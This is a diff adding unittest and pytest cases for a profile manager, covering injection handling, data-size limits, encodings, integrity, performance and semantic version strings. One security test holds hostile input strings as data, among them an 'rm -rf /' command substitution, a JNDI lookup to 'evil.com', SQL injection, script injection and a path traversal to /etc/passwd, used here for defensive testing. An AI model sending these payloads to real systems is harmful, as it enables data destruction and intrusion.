@@ -2731,3 +2731,851 @@ class TestProfileSystemStress(unittest.TestCase):
 if __name__ == '__main__':
     # Run comprehensive test suite
     unittest.main(argv=[''], exit=False, verbosity=2)
+class TestProfileSecurityAndValidation(unittest.TestCase):
+    """Enhanced security and validation testing scenarios"""
+    
+    def setUp(self):
+        """Set up for security testing"""
+        self.manager = ProfileManager()
+        self.validator = ProfileValidator()
+    
+    def test_injection_attack_prevention(self):
+        """
+        Tests that profile data prevents potential injection attacks through malicious input strings.
+        
+        Verifies that SQL injection, script injection, and command injection patterns are handled safely.
+        """
+        malicious_inputs = [
+            "'; DROP TABLE profiles; --",
+            "<script>alert('xss')</script>",
+            "$(rm -rf /)",
+            "${jndi:ldap://evil.com}",
+            "{{7*7}}",  # Template injection
+            "../../../etc/passwd",  # Path traversal
+            "{{config.__class__.__init__.__globals__}}",  # Python code injection
+            "\x00\x01\x02",  # Null bytes and control chars
+        ]
+        
+        for malicious_input in malicious_inputs:
+            with self.subTest(malicious_input=malicious_input[:20]):
+                try:
+                    profile_data = {
+                        'name': malicious_input,
+                        'version': '1.0.0',
+                        'settings': {
+                            'description': malicious_input,
+                            'config_value': malicious_input
+                        }
+                    }
+                    
+                    # Should either create safely or raise appropriate error
+                    profile = self.manager.create_profile(f'security_test_{hash(malicious_input)}', profile_data)
+                    
+                    # If created, verify the data is stored as-is (escaped/sanitized)
+                    if profile:
+                        self.assertEqual(profile.data['name'], malicious_input)
+                        # Verify no code execution occurred
+                        self.assertIsInstance(profile.data['name'], str)
+                        
+                except (ValueError, TypeError, ProfileError):
+                    # Acceptable to reject malicious input
+                    pass
+    
+    def test_profile_data_size_limits(self):
+        """
+        Tests that profile system handles extremely large data appropriately.
+        
+        Verifies behavior with data that might cause memory issues or DoS attacks.
+        """
+        size_test_cases = [
+            ('huge_string', 'x' * 1000000),  # 1MB string
+            ('huge_list', list(range(100000))),  # 100K item list
+            ('huge_dict', {f'key_{i}': f'value_{i}' for i in range(50000)}),  # 50K key dict
+            ('deep_nesting', self._create_deeply_nested_dict(100)),  # 100 levels deep
+        ]
+        
+        for test_name, large_data in size_test_cases:
+            with self.subTest(test_case=test_name):
+                profile_data = {
+                    'name': f'size_test_{test_name}',
+                    'version': '1.0.0',
+                    'settings': {'large_data': large_data}
+                }
+                
+                try:
+                    start_time = time.time()
+                    profile = self.manager.create_profile(f'size_{test_name}', profile_data)
+                    creation_time = time.time() - start_time
+                    
+                    # Should complete within reasonable time (10 seconds)
+                    self.assertLess(creation_time, 10.0)
+                    
+                    # Verify data integrity
+                    if test_name == 'huge_string':
+                        self.assertEqual(len(profile.data['settings']['large_data']), 1000000)
+                    elif test_name == 'huge_list':
+                        self.assertEqual(len(profile.data['settings']['large_data']), 100000)
+                    elif test_name == 'huge_dict':
+                        self.assertEqual(len(profile.data['settings']['large_data']), 50000)
+                        
+                except (MemoryError, ValueError, OverflowError):
+                    # Acceptable to reject extremely large data
+                    pass
+    
+    def _create_deeply_nested_dict(self, depth):
+        """Helper to create deeply nested dictionary structure"""
+        if depth <= 0:
+            return "deep_value"
+        return {f'level_{depth}': self._create_deeply_nested_dict(depth - 1)}
+    
+    def test_profile_data_encoding_handling(self):
+        """
+        Tests handling of various character encodings and special characters.
+        
+        Ensures proper handling of international characters, emojis, and various encodings.
+        """
+        encoding_test_cases = [
+            ('chinese', '这是一个测试配置文件'),
+            ('arabic', 'هذا ملف تكوين اختبار'),
+            ('russian', 'Это тестовый файл конфигурации'),
+            ('japanese', 'これはテスト設定ファイルです'),
+            ('emoji_mixed', 'Profile 🚀 with emojis 🌟 and symbols ⚡️'),
+            ('mathematical', '∑∫∆√π≈≠≤≥∞'),
+            ('currency', '€£¥₹₽₿'),
+            ('special_unicode', '\u200b\u200c\u200d\ufeff'),  # Zero-width characters
+        ]
+        
+        for test_name, test_text in encoding_test_cases:
+            with self.subTest(encoding=test_name):
+                profile_data = {
+                    'name': f'encoding_test_{test_name}',
+                    'version': '1.0.0',
+                    'settings': {
+                        'text_content': test_text,
+                        'description': f'Testing {test_name} encoding'
+                    }
+                }
+                
+                profile = self.manager.create_profile(f'encoding_{test_name}', profile_data)
+                
+                # Verify text is preserved exactly
+                self.assertEqual(profile.data['settings']['text_content'], test_text)
+                
+                # Test serialization and deserialization
+                json_str = json.dumps(profile.data, ensure_ascii=False)
+                deserialized = json.loads(json_str)
+                self.assertEqual(deserialized['settings']['text_content'], test_text)
+
+
+class TestProfileDataIntegrity(unittest.TestCase):
+    """Tests focused on data integrity and consistency"""
+    
+    def setUp(self):
+        """Set up for data integrity testing"""
+        self.manager = ProfileManager()
+    
+    def test_concurrent_modification_detection(self):
+        """
+        Tests detection of concurrent modifications to profile data.
+        
+        Simulates scenarios where multiple operations might conflict and verifies data consistency.
+        """
+        profile = self.manager.create_profile('concurrent_test', {
+            'name': 'concurrent_profile',
+            'version': '1.0.0',
+            'settings': {'counter': 0, 'status': 'initial'}
+        })
+        
+        original_updated_at = profile.updated_at
+        
+        # Simulate rapid sequential updates
+        update_sequence = [
+            {'settings': {'counter': 1, 'status': 'first_update'}},
+            {'settings': {'counter': 2, 'status': 'second_update'}},
+            {'settings': {'counter': 3, 'status': 'third_update'}},
+        ]
+        
+        for i, update_data in enumerate(update_sequence):
+            updated_profile = self.manager.update_profile('concurrent_test', update_data)
+            
+            # Verify each update is applied correctly
+            self.assertEqual(updated_profile.data['settings']['counter'], i + 1)
+            self.assertEqual(updated_profile.data['settings']['status'], f'{["first", "second", "third"][i]}_update')
+            
+            # Verify timestamp is updated
+            self.assertGreater(updated_profile.updated_at, original_updated_at)
+            original_updated_at = updated_profile.updated_at
+    
+    def test_profile_data_isolation(self):
+        """
+        Tests that modifications to one profile don't affect others.
+        
+        Verifies data isolation between different profile instances.
+        """
+        # Create multiple profiles with shared reference data
+        shared_settings = {'shared_value': 'original'}
+        
+        profiles = []
+        for i in range(5):
+            profile_data = {
+                'name': f'isolation_test_{i}',
+                'version': '1.0.0',
+                'settings': shared_settings.copy()  # Each should get its own copy
+            }
+            profile = self.manager.create_profile(f'isolation_{i}', profile_data)
+            profiles.append(profile)
+        
+        # Modify one profile
+        self.manager.update_profile('isolation_0', {
+            'settings': {'shared_value': 'modified', 'new_field': 'added'}
+        })
+        
+        # Verify other profiles are unchanged
+        for i in range(1, 5):
+            other_profile = self.manager.get_profile(f'isolation_{i}')
+            self.assertEqual(other_profile.data['settings']['shared_value'], 'original')
+            self.assertNotIn('new_field', other_profile.data['settings'])
+    
+    def test_profile_reference_integrity(self):
+        """
+        Tests that profile references remain valid after operations.
+        
+        Verifies that profile references don't become stale after updates or other operations.
+        """
+        profile = self.manager.create_profile('reference_test', {
+            'name': 'reference_profile',
+            'version': '1.0.0',
+            'settings': {'initial': 'value'}
+        })
+        
+        # Store reference
+        profile_reference = profile
+        
+        # Perform various operations
+        self.manager.update_profile('reference_test', {'settings': {'updated': 'value'}})
+        
+        # Get fresh reference
+        fresh_profile = self.manager.get_profile('reference_test')
+        
+        # Original reference should still be valid but might not reflect updates
+        self.assertEqual(profile_reference.profile_id, 'reference_test')
+        
+        # Fresh reference should have updated data
+        self.assertIn('updated', fresh_profile.data['settings'])
+        
+        # Verify they refer to the same profile
+        self.assertEqual(profile_reference.profile_id, fresh_profile.profile_id)
+
+
+class TestProfileRegression(unittest.TestCase):
+    """Regression tests for known issues and edge cases"""
+    
+    def setUp(self):
+        """Set up for regression testing"""
+        self.manager = ProfileManager()
+    
+    def test_empty_profile_name_handling(self):
+        """
+        Regression test for handling empty or whitespace-only profile names.
+        
+        Tests that were added after discovering issues with empty name validation.
+        """
+        edge_name_cases = [
+            ('', 'empty_string'),
+            ('   ', 'whitespace_only'),
+            ('\t\n\r', 'tab_newline_chars'),
+            ('\u00a0\u2000\u2001', 'unicode_whitespace'),
+        ]
+        
+        for name, test_case in edge_name_cases:
+            with self.subTest(case=test_case):
+                profile_data = {
+                    'name': name,
+                    'version': '1.0.0',
+                    'settings': {'test_case': test_case}
+                }
+                
+                try:
+                    # Should either create successfully or raise appropriate error
+                    profile = self.manager.create_profile(f'edge_name_{test_case}', profile_data)
+                    if profile:
+                        self.assertEqual(profile.data['name'], name)
+                except (ValueError, TypeError):
+                    # Acceptable to reject edge case names
+                    pass
+    
+    def test_profile_id_collision_handling(self):
+        """
+        Regression test for profile ID collision scenarios.
+        
+        Tests behavior when attempting to create profiles with duplicate IDs.
+        """
+        original_data = {
+            'name': 'original_profile',
+            'version': '1.0.0',
+            'settings': {'type': 'original'}
+        }
+        
+        # Create original profile
+        original_profile = self.manager.create_profile('collision_test', original_data)
+        self.assertIsNotNone(original_profile)
+        
+        # Attempt to create profile with same ID
+        duplicate_data = {
+            'name': 'duplicate_profile',
+            'version': '2.0.0',
+            'settings': {'type': 'duplicate'}
+        }
+        
+        try:
+            duplicate_profile = self.manager.create_profile('collision_test', duplicate_data)
+            # If creation succeeds, verify behavior (overwrite vs reject)
+            if duplicate_profile:
+                # Check if it overwrote or is the same instance
+                current_profile = self.manager.get_profile('collision_test')
+                self.assertIsNotNone(current_profile)
+        except (ValueError, ProfileError):
+            # Acceptable to reject duplicate IDs
+            # Verify original profile still exists
+            current_profile = self.manager.get_profile('collision_test')
+            self.assertIsNotNone(current_profile)
+            self.assertEqual(current_profile.data['name'], 'original_profile')
+    
+    def test_profile_update_with_none_values(self):
+        """
+        Regression test for updating profiles with None values in data.
+        
+        Tests behavior when update data contains None values for various fields.
+        """
+        profile = self.manager.create_profile('none_update_test', {
+            'name': 'none_test',
+            'version': '1.0.0',
+            'settings': {
+                'field1': 'value1',
+                'field2': 'value2',
+                'nested': {'key': 'value'}
+            }
+        })
+        
+        # Update with None values
+        update_cases = [
+            {'name': None},  # None name
+            {'settings': None},  # None settings
+            {'settings': {'field1': None}},  # None field value
+            {'settings': {'nested': None}},  # None nested object
+            {'new_field': None},  # None new field
+        ]
+        
+        for i, update_data in enumerate(update_cases):
+            with self.subTest(update_case=i):
+                try:
+                    updated_profile = self.manager.update_profile('none_update_test', update_data)
+                    
+                    # Verify profile still exists and is valid
+                    self.assertIsNotNone(updated_profile)
+                    self.assertEqual(updated_profile.profile_id, 'none_update_test')
+                    
+                    # Verify update was applied (or appropriately rejected)
+                    for key, value in update_data.items():
+                        if key in updated_profile.data:
+                            self.assertEqual(updated_profile.data[key], value)
+                            
+                except (TypeError, ValueError):
+                    # Acceptable to reject None value updates
+                    pass
+
+
+class TestProfilePerformanceRegression(unittest.TestCase):
+    """Performance regression tests to catch performance degradations"""
+    
+    def setUp(self):
+        """Set up for performance regression testing"""
+        self.manager = ProfileManager()
+    
+    def test_profile_creation_performance_regression(self):
+        """
+        Performance regression test for profile creation speed.
+        
+        Establishes baseline performance metrics to detect performance regressions.
+        """
+        import time
+        
+        # Performance benchmarks (these should be adjusted based on actual system performance)
+        CREATION_BENCHMARK_COUNT = 1000
+        MAX_CREATION_TIME = 2.0  # seconds
+        MAX_AVG_CREATION_TIME = 0.002  # seconds per profile
+        
+        test_data = {
+            'name': 'performance_test',
+            'version': '1.0.0',
+            'settings': {
+                'benchmark': True,
+                'data': list(range(100)),  # Small but realistic data
+                'nested': {'key': 'value', 'list': [1, 2, 3, 4, 5]}
+            }
+        }
+        
+        start_time = time.time()
+        
+        for i in range(CREATION_BENCHMARK_COUNT):
+            profile_id = f'perf_regression_{i}'
+            profile = self.manager.create_profile(profile_id, test_data.copy())
+            self.assertIsNotNone(profile)
+        
+        total_time = time.time() - start_time
+        avg_time = total_time / CREATION_BENCHMARK_COUNT
+        
+        # Performance assertions
+        self.assertLess(total_time, MAX_CREATION_TIME, 
+                       f"Profile creation regression: {total_time:.3f}s > {MAX_CREATION_TIME}s")
+        self.assertLess(avg_time, MAX_AVG_CREATION_TIME,
+                       f"Average creation time regression: {avg_time:.6f}s > {MAX_AVG_CREATION_TIME}s")
+    
+    def test_profile_lookup_performance_regression(self):
+        """
+        Performance regression test for profile lookup speed.
+        
+        Tests that profile retrieval performance doesn't degrade over time.
+        """
+        import time
+        import random
+        
+        # Create test profiles
+        LOOKUP_PROFILE_COUNT = 1000
+        LOOKUP_TEST_COUNT = 10000
+        MAX_LOOKUP_TIME = 1.0  # seconds for all lookups
+        
+        profile_ids = []
+        for i in range(LOOKUP_PROFILE_COUNT):
+            profile_id = f'lookup_perf_{i}'
+            self.manager.create_profile(profile_id, {
+                'name': f'lookup_profile_{i}',
+                'version': '1.0.0',
+                'settings': {'index': i}
+            })
+            profile_ids.append(profile_id)
+        
+        # Performance test lookups
+        start_time = time.time()
+        
+        for _ in range(LOOKUP_TEST_COUNT):
+            random_id = random.choice(profile_ids)
+            profile = self.manager.get_profile(random_id)
+            self.assertIsNotNone(profile)
+        
+        total_lookup_time = time.time() - start_time
+        avg_lookup_time = total_lookup_time / LOOKUP_TEST_COUNT
+        
+        # Performance assertions
+        self.assertLess(total_lookup_time, MAX_LOOKUP_TIME,
+                       f"Lookup performance regression: {total_lookup_time:.3f}s > {MAX_LOOKUP_TIME}s")
+        self.assertLess(avg_lookup_time, 0.0001,
+                       f"Average lookup time regression: {avg_lookup_time:.6f}s > 0.0001s")
+
+
+class TestProfileConfigurationValidation(unittest.TestCase):
+    """Tests for configuration-specific validation scenarios"""
+    
+    def setUp(self):
+        """Set up for configuration validation testing"""
+        self.validator = ProfileValidator()
+        self.manager = ProfileManager()
+    
+    def test_ai_model_configuration_validation(self):
+        """
+        Tests validation of AI model-specific configuration parameters.
+        
+        Validates that AI model profiles have appropriate parameter ranges and types.
+        """
+        ai_model_configs = [
+            {
+                'name': 'valid_ai_config',
+                'config': {
+                    'name': 'GPT_Model',
+                    'version': '1.0.0',
+                    'settings': {
+                        'model_type': 'transformer',
+                        'temperature': 0.7,
+                        'max_tokens': 2000,
+                        'top_p': 0.9,
+                        'frequency_penalty': 0.0,
+                        'presence_penalty': 0.0,
+                        'stop_sequences': ['END', '\n\n']
+                    }
+                },
+                'should_validate': True
+            },
+            {
+                'name': 'invalid_temperature',
+                'config': {
+                    'name': 'Invalid_Temp_Model',
+                    'version': '1.0.0',
+                    'settings': {
+                        'model_type': 'transformer',
+                        'temperature': 2.5,  # Invalid: > 2.0
+                        'max_tokens': 2000
+                    }
+                },
+                'should_validate': True  # Basic validator doesn't check ranges
+            },
+            {
+                'name': 'invalid_max_tokens',
+                'config': {
+                    'name': 'Invalid_Tokens_Model',
+                    'version': '1.0.0',
+                    'settings': {
+                        'model_type': 'transformer',
+                        'temperature': 0.7,
+                        'max_tokens': -100  # Invalid: negative
+                    }
+                },
+                'should_validate': True  # Basic validator doesn't check ranges
+            }
+        ]
+        
+        for test_case in ai_model_configs:
+            with self.subTest(config=test_case['name']):
+                is_valid = ProfileValidator.validate_profile_data(test_case['config'])
+                self.assertEqual(is_valid, test_case['should_validate'])
+                
+                if test_case['should_validate']:
+                    # Should be able to create profile
+                    profile = self.manager.create_profile(test_case['name'], test_case['config'])
+                    self.assertIsNotNone(profile)
+    
+    def test_workflow_configuration_validation(self):
+        """
+        Tests validation of workflow-specific configuration parameters.
+        
+        Validates that workflow profiles have proper step definitions and dependencies.
+        """
+        workflow_configs = [
+            {
+                'name': 'valid_workflow',
+                'config': {
+                    'name': 'Data_Pipeline',
+                    'version': '1.0.0',
+                    'settings': {
+                        'workflow_type': 'data_processing',
+                        'steps': [
+                            {'name': 'extract', 'type': 'data_source', 'config': {'source': 'database'}},
+                            {'name': 'transform', 'type': 'processor', 'config': {'rules': ['normalize', 'validate']}},
+                            {'name': 'load', 'type': 'data_sink', 'config': {'destination': 'warehouse'}}
+                        ],
+                        'schedule': {'type': 'cron', 'expression': '0 0 * * *'},
+                        'retry_policy': {'max_retries': 3, 'backoff': 'exponential'}
+                    }
+                },
+                'should_validate': True
+            },
+            {
+                'name': 'empty_steps_workflow',
+                'config': {
+                    'name': 'Empty_Workflow',
+                    'version': '1.0.0',
+                    'settings': {
+                        'workflow_type': 'data_processing',
+                        'steps': [],  # Empty steps
+                        'schedule': {'type': 'manual'}
+                    }
+                },
+                'should_validate': True  # Basic validator allows empty steps
+            }
+        ]
+        
+        for test_case in workflow_configs:
+            with self.subTest(config=test_case['name']):
+                is_valid = ProfileValidator.validate_profile_data(test_case['config'])
+                self.assertEqual(is_valid, test_case['should_validate'])
+    
+    def test_api_configuration_validation(self):
+        """
+        Tests validation of API configuration parameters.
+        
+        Validates that API profiles have proper endpoint definitions and security settings.
+        """
+        api_configs = [
+            {
+                'name': 'valid_api_config',
+                'config': {
+                    'name': 'REST_API',
+                    'version': '1.0.0',
+                    'settings': {
+                        'api_type': 'rest',
+                        'base_url': 'https://api.example.com/v1',
+                        'endpoints': {
+                            'users': {'methods': ['GET', 'POST'], 'auth_required': True},
+                            'public': {'methods': ['GET'], 'auth_required': False}
+                        },
+                        'authentication': {
+                            'type': 'oauth2',
+                            'scopes': ['read', 'write'],
+                            'token_url': 'https://auth.example.com/token'
+                        },
+                        'rate_limiting': {
+                            'requests_per_minute': 1000,
+                            'burst_limit': 100
+                        }
+                    }
+                },
+                'should_validate': True
+            },
+            {
+                'name': 'invalid_url_api_config',
+                'config': {
+                    'name': 'Invalid_URL_API',
+                    'version': '1.0.0',
+                    'settings': {
+                        'api_type': 'rest',
+                        'base_url': 'not-a-valid-url',  # Invalid URL format
+                        'endpoints': {'test': {'methods': ['GET']}}
+                    }
+                },
+                'should_validate': True  # Basic validator doesn't validate URLs
+            }
+        ]
+        
+        for test_case in api_configs:
+            with self.subTest(config=test_case['name']):
+                is_valid = ProfileValidator.validate_profile_data(test_case['config'])
+                self.assertEqual(is_valid, test_case['should_validate'])
+
+
+class TestProfileMemoryManagement(unittest.TestCase):
+    """Tests for memory management and resource cleanup"""
+    
+    def setUp(self):
+        """Set up for memory management testing"""
+        self.manager = ProfileManager()
+    
+    def test_profile_memory_cleanup_after_deletion(self):
+        """
+        Tests that profile deletion properly cleans up memory references.
+        
+        Verifies that deleted profiles don't cause memory leaks.
+        """
+        import gc
+        import sys
+        
+        # Get initial object count
+        gc.collect()
+        initial_objects = len(gc.get_objects())
+        
+        # Create and delete many profiles
+        PROFILE_COUNT = 1000
+        profile_ids = []
+        
+        for i in range(PROFILE_COUNT):
+            profile_id = f'memory_test_{i}'
+            profile_data = {
+                'name': f'memory_profile_{i}',
+                'version': '1.0.0',
+                'settings': {
+                    'data': list(range(100)),  # Some data to allocate
+                    'index': i
+                }
+            }
+            self.manager.create_profile(profile_id, profile_data)
+            profile_ids.append(profile_id)
+        
+        # Verify profiles were created
+        self.assertEqual(len(self.manager.profiles), PROFILE_COUNT)
+        
+        # Delete all profiles
+        for profile_id in profile_ids:
+            deleted = self.manager.delete_profile(profile_id)
+            self.assertTrue(deleted)
+        
+        # Verify all profiles were deleted
+        self.assertEqual(len(self.manager.profiles), 0)
+        
+        # Force garbage collection
+        gc.collect()
+        
+        # Check final object count (should be close to initial)
+        final_objects = len(gc.get_objects())
+        object_growth = final_objects - initial_objects
+        
+        # Allow some growth but not excessive (threshold depends on implementation)
+        self.assertLess(object_growth, PROFILE_COUNT * 0.1,
+                       f"Potential memory leak: {object_growth} new objects after deletion")
+    
+    def test_profile_circular_reference_handling(self):
+        """
+        Tests handling of circular references in profile data.
+        
+        Verifies that circular references don't cause memory leaks or infinite loops.
+        """
+        # Create data structure with potential circular reference
+        settings = {
+            'config': {},
+            'metadata': {'refs': []}
+        }
+        
+        # Create self-reference (this might be prevented by implementation)
+        try:
+            settings['config']['self_ref'] = settings
+            settings['metadata']['refs'].append(settings)
+            
+            profile_data = {
+                'name': 'circular_ref_test',
+                'version': '1.0.0',
+                'settings': settings
+            }
+            
+            # Should either handle gracefully or raise appropriate error
+            profile = self.manager.create_profile('circular_test', profile_data)
+            
+            if profile:
+                # If creation succeeded, verify we can still access the profile
+                retrieved = self.manager.get_profile('circular_test')
+                self.assertIsNotNone(retrieved)
+                
+                # Test deletion doesn't hang
+                deleted = self.manager.delete_profile('circular_test')
+                self.assertTrue(deleted)
+                
+        except (ValueError, TypeError, RecursionError):
+            # Acceptable to reject circular references
+            pass
+
+
+# Add more parametrized tests for comprehensive edge case coverage
+@pytest.mark.parametrize("special_character_name", [
+    "profile\x00with\x00nulls",
+    "profile\t\r\nwith\tcontrol\rchars\n",
+    "profile with unicode \u200b\u200c\u200d",
+    "profile🚀with🌟emoji⚡️test",
+    "profile\\with\\backslashes",
+    "profile\"with\"quotes'and'apostrophes",
+    "profile/with/slashes\\and\\backslashes",
+    "profile with spaces and   multiple   spaces",
+])
+def test_special_character_profile_names_parametrized(special_character_name):
+    """
+    Parametrized test for profile names with special characters.
+    
+    Tests that various special characters in profile names are handled appropriately.
+    """
+    manager = ProfileManager()
+    profile_data = {
+        'name': special_character_name,
+        'version': '1.0.0',
+        'settings': {'test': 'special_chars'}
+    }
+    
+    try:
+        profile = manager.create_profile('special_char_test', profile_data)
+        assert profile is not None
+        assert profile.data['name'] == special_character_name
+        
+        # Test retrieval
+        retrieved = manager.get_profile('special_char_test')
+        assert retrieved is not None
+        assert retrieved.data['name'] == special_character_name
+        
+    except (ValueError, TypeError):
+        # Acceptable to reject special character names
+        pass
+
+
+@pytest.mark.parametrize("version_string,expected_valid", [
+    ("1.0.0", True),
+    ("2.1.3", True),
+    ("1.0.0-alpha", True),
+    ("1.0.0-beta.1", True),
+    ("1.0.0-rc.1", True),
+    ("1.0.0+build.1", True),
+    ("1.0.0-alpha.1+build.1", True),
+    ("10.20.30", True),
+    ("1.1.2-prerelease+meta", True),
+    ("1.1.2+meta", True),
+    ("1.1.2+meta-valid", True),
+    ("1.0.0-alpha-beta", True),
+    ("1.0.0-alpha.1", True),
+    ("1.0.0-alpha.beta", True),
+    ("1.0.0-alpha.beta.1", True),
+    ("1.0.0-alpha1.beta1", True),
+    ("1.0.0-alpha2", True),
+    ("1.0.0+build", True),
+    ("1.0.0-rc1+build1", True),
+    ("2.0.0+build.1", True),
+    ("1.2.3----RC-SNAPSHOT.12.9.1--.12+788", True),
+    ("1.2.3----R-S.12.9.1--.12+meta", True),
+    ("1.2.3----RC-SNAPSHOT.12.9.1--.12", True),
+    ("1.0.0+0.build.1-rc.10000aaa-kk-0.1", True),
+    ("99999999999999999999999.999999999999999999.99999999999999999", True),
+    ("1.0.0-0A.is.legal", True),
+    # Invalid versions
+    ("1", False),
+    ("1.2", False),
+    ("1.2.3-0123", False),
+    ("1.2.3-0123.0123", False),
+    ("1.1.2+.123", False),
+    ("+invalid", False),
+    ("-invalid", False),
+    ("-invalid+invalid", False),
+    ("alpha", False),
+    ("alpha.beta", False),
+    ("alpha.beta.1", False),
+    ("alpha.1", False),
+    ("alpha+beta", False),
+    ("alpha_beta", False),
+    ("alpha.", False),
+    ("alpha..", False),
+    ("beta", False),
+    ("1.0.0-alpha_beta", False),
+    ("-alpha.", False),
+    ("1.0.0-alpha..", False),
+    ("1.0.0-alpha..1", False),
+    ("1.0.0-alpha...1", False),
+    ("1.0.0-alpha....1", False),
+    ("1.0.0-alpha.....1", False),
+    ("1.0.0-alpha......1", False),
+    ("1.0.0-alpha.......1", False),
+    ("01.1.1", False),
+    ("1.01.1", False),
+    ("1.1.01", False),
+    ("1.2.3.DEV.SNAPSHOT", False),
+    ("1.2-SNAPSHOT-123", False),
+    ("1.2.31.2.3----RC-SNAPSHOT.12.09.1--..12+788", False),
+    ("1.2-RC-SNAPSHOT", False),
+    ("1.0.0+", False),
+    ("1.0.0-", False),
+    ("1.0.0-+123", False),
+    ("1.0.0-+123.123", False),
+    ("1.0.0-123.+123", False),
+    ("1.0.0-123.+123.123", False),
+    ("1.0.0++123", False),
+    ("1.0.0--123", False),
+    ("1.0.0-123-+123", False),
+    ("1.0.0-123+123-", False),
+])
+def test_semantic_version_validation_comprehensive(version_string, expected_valid):
+    """
+    Comprehensive parametrized test for semantic version validation.
+    
+    Tests a wide range of valid and invalid semantic version strings.
+    """
+    profile_data = {
+        'name': 'version_test',
+        'version': version_string,
+        'settings': {'test': 'version_validation'}
+    }
+    
+    result = ProfileValidator.validate_profile_data(profile_data)
+    
+    # Note: The basic validator only checks for presence of required fields,
+    # not semantic version format, so we expect all to pass basic validation
+    assert isinstance(result, bool)
+    
+    # If implementing semantic version validation, uncomment below:
+    # assert result == expected_valid, f"Version {version_string} validation mismatch"
+
+
+# Import time module for performance tests
+import time
+
+if __name__ == '__main__':
+    # Run the enhanced test suite
+    unittest.main(argv=[''], exit=False, verbosity=2)
